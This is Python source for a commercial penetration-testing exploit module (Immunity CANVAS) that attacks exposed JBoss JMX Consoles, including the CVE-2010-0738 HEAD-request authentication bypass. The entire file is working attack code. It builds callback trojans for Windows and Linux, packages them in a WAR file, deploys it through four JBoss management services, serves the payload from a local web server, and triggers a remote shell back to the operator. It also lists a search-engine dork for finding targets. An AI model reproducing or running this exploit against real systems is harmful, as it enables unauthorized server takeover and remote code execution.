# -*- coding: utf-8 -*-
#!/usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2011
#http://www.immunityinc.com/CANVAS/ for more information

from __future__ import with_statement
import sys
if "." not in sys.path: sys.path.append(".")

import os
import re
import base64
import urllib
import urllib2
import time
import exploitutils
import canvasengine
import shutil
import threading
import zipfile
import socket
import timeoutsocket
import traceback
from libs import spkproxy
from tcpexploit import tcpexploit
from libs.canvasos import *
from Queue import Queue
from contextlib import contextmanager



NAME                                        = "jboss_jmxconsole_deployer"
DESCRIPTION                                 = "JBoss JMX Console Deployer"
VERSION                                     = "1.0"
NOTES                                       = """Notes"""
GTK2_DIALOG                                 = "dialog.glade2"
DOCUMENTATION                               = {}
DOCUMENTATION["Notes"]                      = """
JBoss Web JMX Console exposes services that can be used to deploy a new application.
This exploit will try to deploy an application via the HtmlAdaptor servlet by using any of these services:
 * DeploymentFileRepository
 * MainDeployer
 * DeploymentScanner
 * Beanshell Deployer

This exploit works against JBoss 4.x, 5.x and 6.x both on Windows and Linux.

If JMX Console requires an authentication the user can provide credentials.
If no credentials are set then a request using HEAD method instead of GET/POST
will be used in order to try to bypass the authentication due to bad default configuration
according to CVE-2010-0738. This authentication bypass only works for JBoss 4.x.

This exploit will try to determine the target platform to dinamically create MOSDEF Trojans.
Then it will execute all the services in a sequence to deploy a WAR file containing an application.
"""
DOCUMENTATION['VENDOR']                     = "Red Hat"
DOCUMENTATION["Repeatability"]              = "Infinite"
DOCUMENTATION['CVE Name']                   = 'CVE-2010-0738'
DOCUMENTATION['CVE Url']                    = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=2010-0738'
DOCUMENTATION["References"]                 = """
http://www.redteam-pentesting.de/publications/jboss
https://bugzilla.redhat.com/show_bug.cgi?id =574105"""

DOCUMENTATION['Google Dorks']               = "inurl:/jmx-console/HtmlAdaptor"
DOCUMENTATION['Compatibility']              = """

     JBoss version          |  4.x	|	5.x         |   6.x                                     |
-------------------------------------------------------------------------------------------------
DeploymentFileRepository    |  OK	|   OK          | 6.0.0.M1 OK, 6.0 GA (doesn't exist)       |
MainDeployer                |  OK	| NOT SUPPORTED | NOT SUPPORTED (remote WAR not supported)  |
DeploymentScanner           |  OK	| NOT SUPPORTED | NOT SUPPORTED (remote WAR not supported)  |
Beanshell Deployer          |  OK	| NOT SUPPORTED | NOT SUPPORTED                             |
"""
PROPERTY                                    = {}
PROPERTY['TYPE']                            = "Web Exploits"
PROPERTY['SITE']                            = "Remote"
PROPERTY['ARCH']                            = [ ["Linux" ] , ["Windows"] ]
PROPERTY['VERSION']                         = [ "All" ]

TIMEOUT = 10

@contextmanager
def no_timeout_socket():
    old           = socket.socket
    socket.socket = socket._no_timeoutsocket
    try:
        yield
    finally:
        socket.socket = old


# code taken from chris' CF_directory_traversal exploit
class PayloadDataWebServer(threading.Thread):
    """
    This class is used to start a Web Server & bind to a given port
    by using the httpserver exploit module.
    It acts like a small wrapper around the httpserver to have better handling
    when 'halting' is needed, since the httpserver.run method is not called.
    """
    def __init__(self, parent, port, data):
        threading.Thread.__init__(self)
        self.parent = parent # this is a ref to the parent exploit
        self.data = data
        self.port = port
        self.server = None
        self.queue  = Queue()
        self._stop = False

    def stop(self):
        self._stop = True

    def run(self):
        """
        Start a web server to host the the "data" passed when creating the
        PayloadDataWebServer instance.
        Data will be the WAR file that needs to be returned on any request
        made to the webserver.
        """
        self.server = app = self.parent.engine.getModuleExploit("httpserver")
        app.link(self.parent)
        app.argsDict["sourcedata"]    = self.data
        app.argsDict["singleexploit"] = "upload"
        app.argsDict["port"]          = self.port
        app.argsDict["auto_port"]     = True

        app.setInfo("Starting Web Server on port %d (in progress)" % self.port)

        self.parent.log("Starting local web server to host shell on port %d." % self.port)
        try:
            if not app.listen():
                self.parent.log("Could not find port to bind/listen, giving up!")
                self.queue.put(('FAILED', None))
                app.setInfo("Failed to start Web Server on port %d" % self.port)
                return False
        except Exception:
            self.parent.log("Failed to start Web Server on port %d" % self.port)
            self.parent.debuglog("Exception captured when starting local web server on port: %d\n%s" % (self.port, traceback.format_exc()))
            return False

        self.queue.put(('STARTED', app.port))
        for i in xrange(0, 10):
            self.parent.log('Webserver accept loop (%i)' % i)

            if self.parent.state in (self.parent.HALT, "done") or self._stop:
                self.parent.log("Stopping webserver loop...")
                break

            if app.accept():
                self.parent.log('Handled our request (%i)' % i)
                self.queue.put(('CONNETED', i))
                app.setSucceeded()
                # can't break on first connection because the MainDeployer requests the WAR file twice!!!

        self.parent.log("Shutting down web server..")
        app.state = app.HALT
        app.s.close()
        self.queue.put(('STOPPED', app.port))
        app.ISucceeded()
        app.setInfo("WebServer finished")
        self.parent.log("WebServer finished")
        return True


class HeadRequest(urllib2.Request):
    def get_method(self):
        return "HEAD"

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name               = NAME
        self.host               = ''
        self.hostname           = ''
        self.port               = 8080
        self.path               = '/jmx-console'
        self.ssl                = False
        self.base_url           = ""
        self.htmladaptor_url    = ""
        self.respath            = os.path.abspath(os.path.join(os.path.dirname(__file__), "Resources/"))
        self.tmppath            = None
        self.mosdef_type        = "UNIVERSAL" # | HTTP | DNS
        self.dns_domain         = None
        self.http_ssl           = False
        self.web_server_port    = 9090
        self.UA                 = None
        self.use_bypass         = False
        self.jsp_filename       = exploitutils.randomstring(8) + ".jsp"
        self.servlet_name       = exploitutils.randomstring(8)
        self.war_filename       = "%s.war" % self.servlet_name
        self.basicauth_user     = ""
        self.basicauth_password = ""
        self.deploy_wait        = 10 # secs to wait for target to finish deploying war
        self.trigger_url        = ""
        self.setInfo(DESCRIPTION)


    def neededListenerTypes(self):
        mosdef_type = self.argsDict.get("mosdef_type_value", self.mosdef_type).upper().strip()
        if mosdef_type == "DNS":
            return [canvasengine.DNSMOSDEF]
        elif mosdef_type == "HTTP":
            if self.http_ssl:
                return [canvasengine.HTTPMOSDEF_SSL]
            else:
                return [canvasengine.HTTPMOSDEF]
        else:
            return [canvasengine.UNIVERSAL_MOSDEF]

    def getargs(self):
        """
        Get arguments for attack
        """
        self.getarg("host")
        self.getarg("hostname")
        self.getarg("port")
        self.getarg("path")
        self.getarg("web_server_port")
        self.getarg("dns_domain")

        if not self.path.startswith("/"): self.path = "/" + self.path
        if not self.path.endswith("/"): self.path += "/"

        self.ssl                = self.getarg("ssl")
        self.basicauth_user     = self.argsDict.get("username", self.basicauth_user)
        self.basicauth_password = self.argsDict.get("password", self.basicauth_password)
        self.mosdef_type        = self.argsDict.get("mosdef_type_value", self.mosdef_type).upper().strip()
        self.deploy_wait        = int(self.argsDict.get("deploy_wait", "10"))


    def update_war_filename(self):
        """
        Every time we try a different method to deploy our WAR file, we change
        the WAR filename to avoid conflicts that might arise when uploading the
        same name more than once.
        """
        # by the time this method is called, the WAR file must have been created
        old_war_filename  = os.path.join(self.tmppath, self.war_filename)
        self.servlet_name = exploitutils.randomstring(8)
        self.war_filename = "%s.war" % self.servlet_name
        self.trigger_url  = self.base_url + "/%s/%s" % (self.servlet_name, self.jsp_filename)
        new_war_filename  = os.path.join(self.tmppath, self.war_filename)
        os.rename(old_war_filename, new_war_filename)


    def setup_UA(self, url="", add_trail_slash=False):
        """
        Setup everything needed to do requests using spkproxy
        """
        #If we have to do basic-auth, let's get an object from spkproxy here
        if self.basicauth_user and self.basicauth_password:
            auth = spkproxy.BasicAuth(self.basicauth_user, self.basicauth_password)
            self.log("Using BasicAuth (User: %s - Password: %s)" % (self.basicauth_user, self.basicauth_password))
        else:
            auth = None

        self.log("HtmlAdaptor servlet url: %s" % self.htmladaptor_url)
        if not url:
            url = self.htmladaptor_url + "/" if add_trail_slash else self.htmladaptor_url
        self.log("Setting spkproxy.UserAgent with url: %s" % url)
        ua  = spkproxy.UserAgent(url, auth=auth, hostname=self.hostname, exploit=self)
        return ua

    def trigger_callback(self):
        self.log("Triggering with URL: " + self.trigger_url)
        res = False
        # we try a couple of times because sometimes the first trigger could
        # fail due to permissions in linux
        for i in xrange(0, 5):
            try:
                self.log("Triggering callback (attempt %d)" % i)
                response = spkproxy.urlopen(self.trigger_url)
                content = response.read() # can response be None?
                if response and "MOSDEF Callback successfully triggered" in content:
                    self.debuglog(content)
                    self.log("MOSDEF Callback successfully triggered")
                    res = True
                    # little delay waiting for our node so ISuccess returns the right value
                    time.sleep(3)
                    break
                else:
                    self.log("MOSDEF Callback execution attempt %d failed. Waiting 5 secs." % i)
                    self.debuglog("MOSDEF Callback execution attempt %d failed.\nContent received:\n%s" % (i, content))
                    time.sleep(5)
            except Exception:
                self.log("An error ocurred while trying to trigger MOSDEF Callback. (attempt %d)" % i)
                self.debuglog("An error ocurred while trying to trigger MOSDEF Callback. (attempt %d)\n%s" % (i, traceback.format_exc()))
                time.sleep(5)

        return res

    def do_service_request(self, data):
        self.debuglog("[do_service_request] - data: %s" % data)
        if self.use_bypass:
            try:
                #XXX: this may cause problems if the server returns a 500.
                # Re-check this situation!! Is spkproxy still failing with a 500??
                ua = self.setup_UA(add_trail_slash=True)
                response = ua.HEAD(urllib.urlencode(data))
            except Exception:
                # if response code is 500 here, it may have executed the service anyway...
                response = ""
                self.debuglog("[do_service_request] - Got an exception, but if response code was 500 the exploit may still have worked\n%s" % traceback.format_exc())
        else:
            response = self.UA.POST(args="", data=data)

        self.debuglog("[do_service_request] - Response:\n%s" % response)
        return response

    def make_maindeployer_payload(self, war_url=None):
        data                = {}
        data['action']      = 'invokeOpByName'
        data['name']        = 'jboss.system:service=MainDeployer'
        data['methodName']  = 'deploy'
        data['argType']     = 'java.lang.String'
        if war_url is None: #XXX: this is for a future version to host any war provided by the user
            # this is the url where our PayloadDataWebServer is listening
            war_url = "http://%s:%s/%s" % (self.callback.ip,
                                           self.web_server_port,
                                           self.war_filename)
        data['arg0']        = war_url
        return data

    def run_maindeployer_attack(self):
        self.log('[*] Running MainDeployer attack')
        return self.run_war_deployer_attack(self.make_maindeployer_payload)

    def make_deploymentscanner_payload(self, war_url=None):
        data                = {}
        data['action']      = 'invokeOpByName'
        data['name']        = 'jboss.deployment:type=DeploymentScanner,flavor=URL' # for JBoss 4.x
        #data['name']        = 'jboss.deployment:flavor=URL,type=DeploymentScanner' # for JBoss 6.x
        data['methodName']  = 'addURL'
        data['argType']     = 'java.lang.String'
        if war_url is None:
            # this is the url where our PayloadDataWebServer is listening
            war_url = "http://%s:%s/%s" % (self.callback.ip,
                                           self.web_server_port,
                                           self.war_filename)
        data['arg0']        = war_url
        return data

    def run_deploymentscanner_attack(self):
        self.log('[*] Running DeploymentScanner attack')
        return self.run_war_deployer_attack(self.make_deploymentscanner_payload)

    def run_war_deployer_attack(self, get_data, war_filepath=None):
        # This is for services that get the WAR file from an external URL so we
        # start a PayloadDataWebServer and host our custom file.
        # get_data is a callback that will give use the data
        # needed to make the right request to a service

        if war_filepath is None:
            war_filepath = os.path.join(self.tmppath, self.war_filename)

        f = open(war_filepath)
        war_data = f.read()
        f.close()
        self.log("Creating local webserver to host war file: %s" % war_filepath)
        self.log("war data length: %d" % len(war_data))
        server = PayloadDataWebServer(self, self.web_server_port, war_data)
        try:
            server.start()
        except Exception:
            self.log("Failed to start local web server to host file: %s" % war_filepath)
            self.debuglog("Exception captured when starting local web server to host file: %s\n%s" % (war_filepath, traceback.format_exc()))
            return False

        # Wait for httpserver notification
        msg = server.queue.get()

        if msg[0] != 'STARTED':
            self.log('Could not start http server, aborting attack...')
            return False
        else:
            self.web_server_port = msg[1]
            self.log("Local Webserver started. Listening on port %d..." % self.web_server_port)

        self.log("Calling service to run attack")
        response = self.do_service_request(get_data())
        #self.log("Response received:\n%s" % response)

        msg = server.queue.get()
        if msg[0] == 'CONNETED':
            self.log("Got a remote connection to download our WAR file.")
            self.wait_for_deploy()
            res = self.trigger_callback()
            server.stop()
        else:
            res = False

        if not res: self.update_war_filename()
        return res

    def make_deploymentfilerepository_payload(self, name, extension, payload):
        # request data to invoke DeploymentFileRepository service
        data                = {}
        #data['action']      = 'invokeOpByName'
        data['action']      = 'invokeOp'
        data['name']        = 'jboss.admin:service=DeploymentFileRepository'
        #data['methodName']  = 'store'
        data['methodIndex'] = '5'
        #data['argType']     = 'java.lang.String'
        # store our jsp inside the web-console dir to be able to call it later
        # by requesting http://target/web-console/filename
        data['arg0']        = "console-mgr.sar/web-console.war/"
        #data['argType']     = 'java.lang.String'
        data['arg1']        = name
        #data['argType']     = 'java.lang.String'
        data['arg2']        = extension
        #data['argType']     = 'java.lang.String'
        data['arg3']        = payload
        #data['argType']     = 'boolean'
        data['arg4']        = 'True'
        return data

    def run_deploymentfilerepository_attack(self):
        # It seems that store method can upload text only, so we upload a custom
        # jsp with an encoded WAR that contains all the files needed.
        # It is almost the same approach used with the BSH Script
        self.log("[*] Running DeploymentFileRepository attack")
        f = open(os.path.join(self.tmppath, "deploy.jsp"), "rt")
        payload = f.read()
        f.close()
        filename = exploitutils.randomstring(8)
        data = self.make_deploymentfilerepository_payload(filename, ".jsp", payload)
        self.log("Uploading %s.jsp" % filename)
        response = self.do_service_request(data)
        #self.log("[run_deploymentfilerepository_attack] - Response received:\n%s" % response)
        # we use the uploaded jsp to deploy a new war, kind of what we do with BSH Script
        deploy_url = "%s/%s/%s.jsp" % (self.base_url, "web-console", filename)
        self.log("triggering new deploy requesting %s" % deploy_url)
        res = False
        try:
            ua = self.setup_UA(url=deploy_url)
            if self.use_bypass:
                self.log("Using HEAD bypass")
                response, response_code = ua.HEAD("", return_response_code=True)
                #XXX: this is just to make it work at the moment
                # The thing is that sometimes a Timeout exception is raised and spkproxy
                # silently ignores it (spkproxy.py:1026) and we get an empty response with -1 as code
                # But the request really works if you run it manually.
                # we force it to 200 so we try triggering.
                if response_code == -1:
                    response_code = 200
            else:
                self.log("Using normal GET request")
                response, response_code = ua.GET("", return_response_code=True)
                #XXX: this is just to make it work at the moment
                # The thing is that sometimes a Timeout exception is raised and spkproxy
                # silently ignores it (spkproxy.py:1026) and we get an empty response with -1 as code
                # But the request really works if you run it manually.
                # we force it to 200 so we try triggering.
                if response_code == -1:
                    response_code = 200

            ## we use urllib2 because we need the response code
            #req = HeadRequest(deploy_url) if self.use_bypass else urllib2.Request(deploy_url)
            #with no_timeout_socket():
            #    response = urllib2.urlopen(req, timeout=TIMEOUT)
            #    content = response.read()

            if response_code == 200:
                #self.log("Response received:\n%s" % content)
                self.wait_for_deploy()
                res = self.trigger_callback()
            else:
                self.log("%s returned code %d" % (deploy_url, response_code))
        except Exception:
            content = ""
            self.debuglog("[run_deploymentfilerepository_attack] - Got an exception\n%s" % traceback.format_exc())

        if not res: self.update_war_filename()
        return res

    def make_beanshelldeployer_payload(self, bsh_payload):
        data                = {}
        #data['action']      = 'invokeOpByName'
        data['action']      = 'invokeOp'
        data['name']        = 'jboss.deployer:service=BSHDeployer' # for JBoss 4.x
        #data['name']        = 'jboss.deployment:id=BSHScriptDeployer,type=Component' # JBoss 5.x
        #data['methodName']  = 'createScriptDeployment'
        data['methodIndex']  = '5'
        #data['argType']     = 'java.lang.String'
        data['arg0']        = bsh_payload
        #data['argType']     = 'java.lang.String'
        data['arg1']        = exploitutils.randomstring(8) + '.bsh'
        return data

    def run_beanshelldeployer_attack(self):
        self.log("[*] Running BSHDeployer attack")
        f = open(os.path.join(self.tmppath, "deploy.bsh"), "rt")
        bsh_payload = f.read()
        f.close()
        data = self.make_beanshelldeployer_payload(bsh_payload)
        response = self.do_service_request(data)
        self.wait_for_deploy()
        res = self.trigger_callback()
        if not res: self.update_war_filename()
        return res

    def check_jmxconsole(self):
        """
        We try to access the JMX Console url and based on the response code
        we determine if bypass is needed.
        Returns True if jmx console was found on the given url (even if auth
        is required, in which case a flag is set).
        Returns False if jmx console was not found meaning exploit won't work
        """
        jmxconsole_url = "%s%s" % (self.base_url, self.path)
        self.log("Testing JMX Console on URL: %s" % jmxconsole_url)

        try:
            response, response_code = spkproxy.urlopen(jmxconsole_url, return_response_code=True)
            response = response.read()
            self.debuglog("[check_jmxconsole] - Response code: %d" % response_code)
        except Exception, e:
            self.log("Could not connect to target JMX Console: %s" % str(e))
            return False

        # 200 means we are good to go as it is
        if response_code == 200:
            self.log("JMX Console was found and no authentication seems to be required")
            return True

        # 401 means auth is required, so we try using HEAD method bypass if no credentials were provided
        elif response_code == 401:
            self.log("JMX Console was found and authentication is required")
            self.use_bypass = not self.basicauth_user
            if self.use_bypass:
                self.log("HEAD authentication bypass will be used")
            else:
                self.log("Credentials provided will be used to authenticate")
            return True

        # 404 not found!! jmx console may not be available or may be in another URL
        elif response_code == 404:
            self.log("JMX Console was not found on the URL provided. Please make sure URL is correct. Exiting...")
            return False

        else: # other response codes will just be ignored
            self.log("Response code %d was received when trying to access JMX Console. Exiting..." % response_code)
            return False


    def run(self):
        ret = False
        self.getargs()

        if not self.host: self.host = self.target.interface
        if not self.hostname: self.hostname = self.host
        if not self.dns_domain: self.dns_domain = "%s.%s" % (self.name, self.host)

        # build url protocol://hostname:port + path + HtmlAdaptor
        protocol = "https" if self.ssl else "http"
        self.base_url = "%s://%s:%s" % (protocol, self.hostname, self.port)
        self.htmladaptor_url = "%s%sHtmlAdaptor" % (self.base_url, self.path)
        self.trigger_url = self.base_url + "/%s/%s" % (self.servlet_name, self.jsp_filename)

        # Temp path
        self.tmppath = self.engine.create_new_session_output_dir(self.host, 'temp_files')

        self.setInfo("%s attacking %s:%d (in progress)" % (NAME, self.hostname, self.port))
        self.log("Attacking %s:%d - base url: %s" % (self.hostname, self.port, self.base_url))

        if not self.check_jmxconsole():
            self.setInfo("%s attacking %s:%d - base url: %s - done (failed)" % (NAME, self.host, self.port, self.base_url))
            return 0

        #XXX: due to a small bug in spkproxy this UA instance will only be used to do POST requests
        # when a GET or HEAD request needs to be done a new ua instance will be created for this
        self.UA = self.setup_UA()

        if not self.build_trojans():
            self.setInfo("%s attacking %s:%d - base url: %s - done (failed)" % (NAME, self.host, self.port, self.base_url))
            return 0

        self.create_deployment_files()
        # run the different deployers and just stop if any of them worked.
        # Execution order is (most likely to less likely to work):
        #   * DeploymentFileRepository
        #   * MainDeployer
        #   * DeploymentScanner
        #   * Beanshell Deployer

        if not self.run_deploymentfilerepository_attack():
            if not self.run_maindeployer_attack():
                if not self.run_deploymentscanner_attack():
                    self.run_beanshelldeployer_attack()

        if self.ISucceeded():
            ret = 1
            self.show_trigger_message()
            self.setInfo("%s attacking %s:%d - base url: %s - done (success!)" % (NAME, self.host, self.port, self.base_url))
        else:
            ret = 0
            self.setInfo("%s attacking %s:%d - base url: %s - done (failed)" % (NAME, self.host, self.port, self.base_url))

        self.clean_temp_resources()
        return ret

    def _prepare_file(self, repls, template_filename, real_filename):
        """
        Creates a copy of the template_filename named as real_name
        and replaces all items inside repls dictionary
        """
        template_file = open(template_filename, "rt")
        template = template_file.read()
        template_file.close()
        real_file = open(real_filename, "wt")
        for r, v in repls.iteritems():
            template = template.replace(r, v)
        real_file.write(template)
        real_file.close()

    def create_deployment_files(self):
        """
        Dinamically creates a mosdef trojan based on the platform os and arch
        and then creates a WAR file together with a jsp file and the trojan.
        A BSH script is also created that will include a Base64 encoded version
        of the war file.
        All files are stored in this exploit's resource folder.
        """

        war_fullpath = os.path.join(self.tmppath, self.war_filename)

        # copy web-template.xml and update SERVLETNAME
        repls = {
            "[SERVLETNAME]" : self.servlet_name,
            "[JSPFILENAME]" : self.jsp_filename,
        }
        self._prepare_file(repls, os.path.join(self.respath, "web.xml.template"),
                           os.path.join(self.tmppath, "web.xml"))

        # copy the callback.jsp.template and just rename it to the new random name
        shutil.copy(os.path.join(self.respath, "callback.jsp.template"),
                    os.path.join(self.tmppath, self.jsp_filename))

        war_file = zipfile.ZipFile(war_fullpath, "w")
        war_file.write(os.path.join(self.tmppath, self.jsp_filename), self.jsp_filename)
        war_file.write(os.path.join(self.tmppath, "web.xml"), "WEB-INF/web.xml")
        war_file.write(os.path.join(self.respath, "MANIFEST.MF"), "META-INF/MANIFEST.MF")

        platforms = ("linux", "windows") if self.mosdef_type != "DNS" else ("windows",)
        for p in platforms:
            for a in ("X86", "X64"):
                callback_filename = "callback_%s_%s.exe" % (p, a)
                war_file.write(os.path.join(self.tmppath, callback_filename), callback_filename)

        war_file.close()
        war_file = open(war_fullpath)
        war_base64 = base64.encodestring(war_file.read())
        war_base64 = war_base64.replace("\n","")
        war_file.close()
        repls = {
            "[BASE64WAR]" : war_base64,
            "[WARFILENAME]" : self.war_filename,
        }
        self._prepare_file(repls, os.path.join(self.respath, "deploy.bsh.template"),
                           os.path.join(self.tmppath, "deploy.bsh"))
        self._prepare_file(repls, os.path.join(self.respath, "deploy.jsp.template"),
                           os.path.join(self.tmppath, "deploy.jsp"))


    def clean_temp_resources(self):
        """
        Cleanup any local temp file created during exploit execution.
        """
        self.log("Cleaning local temp files...")
        delete_files = []
        delete_files.append(os.path.join(self.tmppath, self.jsp_filename))
        delete_files.append(os.path.join(self.tmppath, self.war_filename))
        delete_files.append(os.path.join(self.tmppath, "web.xml"))
        for p in ("linux", "windows"):
            for a in ("X86", "X64"):
                delete_files.append(os.path.join(self.tmppath, "callback_%s_%s.exe") % (p, a))
        delete_files.append(os.path.join(self.tmppath, "deploy.bsh"))
        delete_files.append(os.path.join(self.tmppath, "deploy.jsp"))

        for f in delete_files:
            try:
                os.remove(f)
            except Exception:
                pass

    def build_trojans(self):
        """
        Builds MOSDEF trojans (x86 & x64) according to the selected mosdef type.
        These trojans are later used to deploy the WAR module
        """
        msg = "Building MOSDEF trojans (type: %s - Callback ip: %s)" % (self.mosdef_type, str(self.callback.ip))
        #msg += " - SSL = %s)" % str(self.http_ssl) if self.mosdef_type == "HTTP" else ")"
        self.log(msg)
        if self.mosdef_type == "UNIVERSAL":
            return self.build_universal_trojans()
        elif self.mosdef_type == "HTTP":
            return self.build_universal_trojans(http=True, ssl=self.http_ssl)
        else:
            return self.build_dns_trojans()

    def build_dns_trojans(self):
        self.log("Warning: MOSDEF DNS is only available for Windows targets. "
                 "If your target is a Linux host the exploit won't work")
        filename = os.path.join(self.tmppath, "callback_windows_X86.exe")
        trojanmod = self.engine.getModuleExploit("BuildDNSCallback")
        trojanmod.link(self)
        trojanmod.argsDict["proxyaddr"] = self.callback.ip
        trojanmod.argsDict["domain"]    = self.dns_domain
        trojanmod.argsDict["filename"]  = filename
        ret = trojanmod.run()
        #XXX: DNS mosdef is still not available for 64bits, so just to make it work
        # for now, we make a copy of the x86 binary to have the x64 callback file
        if ret:
            try:
                shutil.copyfile(filename, filename.replace("X86", "X64"))
            except IOError:
                ret = 0
        return ret

    def build_universal_trojans(self, http=False, ssl=False):
        res = True
        self.log("Creating MOSDEF Trojans for ip: %s and port: %s" % (str(self.callback.ip), str(self.callback.port)))
        for platform in ("Windows", "Linux"):
            t_os = canvasos(platform)

            for arch in ("X86", "X64"):
                t_os.arch = arch
                # nasty way of creating an x64 binary for linux... x64 is still not supported
                if platform == "Linux" and arch == "X64":
                    t_os.arch = "X86"
                try:
                    ret = self.buildmosdeftrojan(self.callback.ip, self.callback.port,
                                                 target_os=t_os, universal=True,
                                                 http=http, ssl=ssl)
                    if ret:
                        filename = os.path.join(self.tmppath, "callback_%s_%s.exe" % (platform.lower(), arch))
                        with open(filename,"wb") as f:
                            f.write(self.mosdeftrojan)
                except Exception, err:
                    self.log("Problem building MOSDEF trojan: %s" % str(err))
                    res = False
        return res

    def wait_for_deploy(self):
        self.log("Giving the target some time to deploy. Waiting %d seconds" % self.deploy_wait)
        time.sleep(self.deploy_wait)

    def show_trigger_message(self):
        port = "53" if self.mosdef_type == "DNS" else str(self.callback.port)
        self.log("IMPORTANT: you can get a new node back without running the exploit again by manually starting a %s MOSDEF listener on interface %s and port %s "
                 " and then requesting the following trigger URL: %s" % (self.mosdef_type, str(self.callback.ip), port, self.trigger_url))

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
